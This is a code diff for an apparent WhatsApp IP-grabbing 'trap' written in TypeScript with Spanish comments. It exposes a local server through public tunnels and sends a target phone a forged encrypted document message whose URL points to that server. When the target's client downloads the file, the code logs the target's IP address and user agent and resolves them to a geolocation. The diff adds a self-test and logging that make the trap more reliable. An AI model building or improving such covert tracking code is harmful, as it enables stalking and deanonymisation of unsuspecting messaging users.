@@ -1,4 +1,4 @@
-import { createCipheriv, createHash, createHmac, hkdfSync, randomBytes } from "node:crypto";
+import { createCipheriv, createDecipheriv, createHash, createHmac, hkdfSync, randomBytes } from "node:crypto";
 import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
 import { spawn, type ChildProcess } from "node:child_process";
 
@@ -29,6 +29,7 @@ export interface TrapHit {
   ip: string;
   ua: string;
   at: number;
+  self?: boolean;
   geo?: GeoInfo | null;
 }
 
@@ -47,14 +48,14 @@ export interface TrapSession {
   createdAt: number;
   hits: TrapHit[];
   closed: boolean;
-  onHit: (s: TrapSession, h: TrapHit, idx: number) => Promise<void>;
+  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
   onExpire: (s: TrapSession) => Promise<void>;
   timer: NodeJS.Timeout;
 }
 
 const sessions = new Map<string, TrapSession>();
 
-/* ─────────── listener local + cadena de túneles ─────────── */
+/* ─────────── listener + túneles ─────────── */
 
 let server: Server | null = null;
 let port = 0;
@@ -72,6 +73,7 @@ async function startServer(): Promise<void> {
       resolve();
     });
   });
+  console.log(`[whoisIP] listener local en ${LOCAL_HOST}:${port}`);
 }
 
 async function probe(base: string): Promise<boolean> {
@@ -82,8 +84,7 @@ async function probe(base: string): Promise<boolean> {
         signal: AbortSignal.timeout(9000),
       });
       const ct = r.headers.get("content-type") ?? "";
-      const body = (await r.text()).trim();
-      if (r.ok && !ct.includes("text/html") && body === "pong") return true;
+      if (r.ok && !ct.includes("text/html") && (await r.text()).trim() === "pong") return true;
     } catch {}
   }
   return false;
@@ -91,13 +92,20 @@ async function probe(base: string): Promise<boolean> {
 
 async function viaLocaltunnel(): Promise<string | null> {
   const lt: any = await import("localtunnel").catch(() => null);
-  if (!lt?.default) return null;
-  const t = await lt.default({ port, local_host: LOCAL_HOST }).catch(() => null);
+  if (!lt?.default) {
+    console.log("[whoisIP] localtunnel no instalado");
+    return null;
+  }
+  const t = await lt.default({ port, local_host: LOCAL_HOST }).catch((e: any) => {
+    console.log("[whoisIP] localtunnel fallo:", e?.message);
+    return null;
+  });
   if (!t) return null;
   if (await probe(t.url)) {
     closers.push(() => t.close());
     return t.url as string;
   }
+  console.log("[whoisIP] localtunnel no paso el probe, descartado");
   t.close();
   return null;
 }
@@ -106,7 +114,10 @@ async function viaTunnelmole(): Promise<string | null> {
   const tm: any = await import("tunnelmole").catch(() => null);
   const fn = tm?.tunnelmole ?? tm?.default?.tunnelmole;
   if (typeof fn !== "function") return null;
-  const url: string | null = await fn({ port }).catch(() => null);
+  const url: string | null = await fn({ port }).catch((e: any) => {
+    console.log("[whoisIP] tunnelmole fallo:", e?.message);
+    return null;
+  });
   if (!url) return null;
   if (await probe(url)) return url;
   return null;
@@ -121,7 +132,6 @@ async function viaCloudflared(): Promise<string | null> {
   } catch {
     return null;
   }
-
   const url = await new Promise<string | null>((resolve) => {
     const timer = setTimeout(() => resolve(null), 25_000);
     const onData = (b: Buffer) => {
@@ -136,7 +146,6 @@ async function viaCloudflared(): Promise<string | null> {
     proc.once("error", () => resolve(null));
     proc.once("exit", () => resolve(null));
   });
-
   if (url && (await probe(url))) {
     closers.push(() => proc.kill());
     return url;
@@ -162,17 +171,17 @@ export async function ensurePublicBase(): Promise<string> {
     const fallos: string[] = [];
 
     for (const name of order) {
+      console.log(`[whoisIP] probando túnel: ${name}`);
       const url = await PROVIDERS[name]().catch(() => null);
       if (url) {
+        console.log(`[whoisIP] túnel activo: ${url}`);
         publicBase = url;
         return url;
       }
       fallos.push(name);
     }
 
-    throw new Error(
-      `Ningún túnel público respondió (${fallos.join(", ")}). Corre \`npm i localtunnel tunnelmole\` y reinicia, o define TRAP_BASE_URL.`
-    );
+    throw new Error(`ningún túnel respondió (${fallos.join(", ")}). Corre "npm i localtunnel tunnelmole" o define TRAP_BASE_URL`);
   })().finally(() => {
     bootstrapping = null;
   });
@@ -190,18 +199,24 @@ export function stopTrap() {
   server = null;
 }
 
-/* ─────────── cifrado de media ─────────── */
+/* ─────────── cifrado ─────────── */
 
 function hkdf(key: Buffer, salt: Buffer, info: string, size: number): Buffer {
   return Buffer.from(hkdfSync("sha256", key, salt, Buffer.from(info), size));
 }
 
+function keysFor(mediaKey: Buffer) {
+  const expanded = hkdf(mediaKey, Buffer.alloc(32), "WhatsApp Document Keys", 112);
+  return {
+    iv: expanded.subarray(0, 16),
+    cipherKey: expanded.subarray(16, 48),
+    macKey: expanded.subarray(48, 80),
+  };
+}
+
 function encryptMedia(plain: Buffer) {
   const mediaKey = randomBytes(32);
-  const expanded = hkdf(mediaKey, Buffer.alloc(32), "WhatsApp Document Keys", 112);
-  const iv = expanded.subarray(0, 16);
-  const cipherKey = expanded.subarray(16, 48);
-  const macKey = expanded.subarray(48, 80);
+  const { iv, cipherKey, macKey } = keysFor(mediaKey);
   const cipher = createCipheriv("aes-256-cbc", cipherKey, iv);
   const enc = Buffer.concat([cipher.update(plain), cipher.final()]);
   const mac = createHmac("sha256", macKey).update(iv).update(enc).digest().subarray(0, 10);
@@ -214,6 +229,20 @@ function encryptMedia(plain: Buffer) {
   };
 }
 
+function decryptMedia(bytes: Buffer, mediaKey: Buffer): Buffer | null {
+  try {
+    const body = bytes.subarray(0, bytes.length - 10);
+    const mac = bytes.subarray(bytes.length - 10);
+    const { iv, cipherKey, macKey } = keysFor(mediaKey);
+    const calc = createHmac("sha256", macKey).update(iv).update(body).digest().subarray(0, 10);
+    if (!calc.equals(mac)) return null;
+    const d = createDecipheriv("aes-256-cbc", cipherKey, iv);
+    return Buffer.concat([d.update(body), d.final()]);
+  } catch {
+    return null;
+  }
+}
+
 /* ─────────── sesiones ─────────── */
 
 export interface CreateSessionOpts {
@@ -223,7 +252,7 @@ export interface CreateSessionOpts {
   targetPhone: string;
   chatJid: string;
   pushName: string;
-  onHit: (s: TrapSession, h: TrapHit, idx: number) => Promise<void>;
+  onHit: (s: TrapSession, h: TrapHit) => Promise<void>;
   onExpire: (s: TrapSession) => Promise<void>;
 }
 
@@ -273,18 +302,49 @@ export function closeSession(s: TrapSession) {
 async function expire(s: TrapSession) {
   if (s.closed) return;
   s.closed = true;
-  if (s.hits.length === 0) await s.onExpire(s).catch(() => undefined);
+  const real = s.hits.filter((h) => !h.self).length;
+  if (real === 0) await s.onExpire(s).catch(() => undefined);
   const t = setTimeout(() => sessions.delete(s.id), KEEP_AFTER_CLOSE_MS);
   t.unref?.();
+}
+
+export function sessionUrl(s: TrapSession) {
+  return `${s.base}/t/${s.id}/${s.fileName}`;
+}
+
+/** Descarga el propio archivo por el túnel, lo descifra y compara el hash. */
+export async function selfTest(s: TrapSession): Promise<{ ok: boolean; reason?: string; ms?: number }> {
+  const t0 = Date.now();
+  try {
+    const r = await fetch(`${sessionUrl(s)}?self=1`, {
+      headers: { "User-Agent": PROBE_UA, Accept: "*/*" },
+      signal: AbortSignal.timeout(15_000),
+    });
+    if (!r.ok) return { ok: false, reason: `HTTP ${r.status}` };
+    if ((r.headers.get("content-type") ?? "").includes("text/html"))
+      return { ok: false, reason: "el túnel devolvió HTML en vez del archivo" };
+    const buf = Buffer.from(await r.arrayBuffer());
+    if (buf.length !== s.bytes.length)
+      return { ok: false, reason: `tamaño ${buf.length} != ${s.bytes.length}` };
+    const plain = decryptMedia(buf, s.mediaKey);
+    if (!plain) return { ok: false, reason: "el descifrado falló" };
+    if (!createHash("sha256").update(plain).digest().equals(s.fileSha256))
+      return { ok: false, reason: "hash distinto tras descifrar" };
+    return { ok: true, ms: Date.now() - t0 };
+  } catch (e: any) {
+    return { ok: false, reason: e?.message ?? String(e) };
+  }
 }
 
 /* ─────────── captura ─────────── */
 
 function clientIp(req: IncomingMessage): string {
-  const xff = String(req.headers["x-forwarded-for"] ?? "");
-  const cf = String(req.headers["cf-connecting-ip"] ?? "");
-  const xrl = String(req.headers["x-real-ip"] ?? "");
-  const raw = cf || xrl || xff.split(",")[0].trim() || String(req.socket.remoteAddress ?? "");
+  const h = req.headers;
+  const raw =
+    String(h["cf-connecting-ip"] ?? "") ||
+    String(h["x-real-ip"] ?? "") ||
+    String(h["x-forwarded-for"] ?? "").split(",")[0].trim() ||
+    String(req.socket.remoteAddress ?? "");
   return raw.replace(/^::ffff:/, "").replace(/^\[|\]$/g, "").trim();
 }
 
@@ -310,7 +370,7 @@ async function geoLookup(ip: string): Promise<GeoInfo | null> {
       { signal: AbortSignal.timeout(4500) }
     );
     const j: any = await r.json();
-    if (j.status === "success") {
+    if (j.status === "success")
       return {
         country: j.country,
         countryCode: j.countryCode,
@@ -326,14 +386,11 @@ async function geoLookup(ip: string): Promise<GeoInfo | null> {
         mobile: j.mobile,
         hosting: j.hosting,
       };
-    }
   } catch {}
   try {
-    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
-      signal: AbortSignal.timeout(4500),
-    });
+    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { signal: AbortSignal.timeout(4500) });
     const j: any = await r.json();
-    if (j.success) {
+    if (j.success)
       return {
         country: j.country,
         countryCode: j.country_code,
@@ -346,21 +403,20 @@ async function geoLookup(ip: string): Promise<GeoInfo | null> {
         lon: j.longitude,
         tz: j.timezone?.id,
       };
-    }
   } catch {}
   return null;
 }
 
 export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
-  const path = new URL(req.url ?? "/", "http://local").pathname;
+  const url = new URL(req.url ?? "/", "http://local");
 
-  if (path === "/__ping") {
+  if (url.pathname === "/__ping") {
     res.statusCode = 200;
     res.setHeader("Content-Type", "text/plain");
     return res.end("pong");
   }
 
-  const [, prefix, id] = path.split("/");
+  const [, prefix, id] = url.pathname.split("/");
   if (prefix !== "t") {
     res.statusCode = 404;
     return res.end("404");
@@ -385,19 +441,22 @@ export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
 
   if (req.method !== "GET") return;
 
+  const isSelf = url.searchParams.get("self") === "1";
   const ip = clientIp(req);
   if (isPrivate(ip)) return;
-  if (s.hits.length >= MAX_HITS) return;
+
+  if (isSelf) {
+    s.hits.push({ ip, ua: PROBE_UA, at: Date.now(), self: true });
+    return;
+  }
+
+  if (s.hits.filter((h) => !h.self).length >= MAX_HITS) return;
   if (s.hits.some((h) => h.ip === ip)) return;
 
-  const hit: TrapHit = {
-    ip,
-    ua: String(req.headers["user-agent"] ?? "desconocido"),
-    at: Date.now(),
-  };
-  const idx = s.hits.push(hit) - 1;
+  const hit: TrapHit = { ip, ua: String(req.headers["user-agent"] ?? "desconocido"), at: Date.now() };
+  s.hits.push(hit);
   hit.geo = await geoLookup(ip).catch(() => null);
-  await s.onHit(s, hit, idx).catch(() => undefined);
+  await s.onHit(s, hit).catch(() => undefined);
 }
 
 /* ─────────── mensaje ─────────── */
@@ -405,15 +464,18 @@ export async function trapHandler(req: IncomingMessage, res: ServerResponse) {
 export function buildDocumentMessage(s: TrapSession, caption: string, contextInfo?: any) {
   return {
     documentMessage: {
-      url: `${s.base}/t/${s.id}/${s.fileName}`,
-      directPath: `/t/${s.id}/${s.fileName}`,
+      url: sessionUrl(s),
+      directPath: `/v/${s.id}/${s.fileName}`,
       mimetype: "image/jpeg",
+      title: s.fileName,
       fileName: s.fileName,
       fileLength: s.bytes.length,
       mediaKey: s.mediaKey,
       fileSha256: s.fileSha256,
       fileEncSha256: s.fileEncSha256,
       mediaKeyTimestamp: Math.floor(Date.now() / 1000),
+      pageCount: 1,
+      contactVcard: false,
       caption,
       ...(contextInfo ? { contextInfo } : {}),
     },
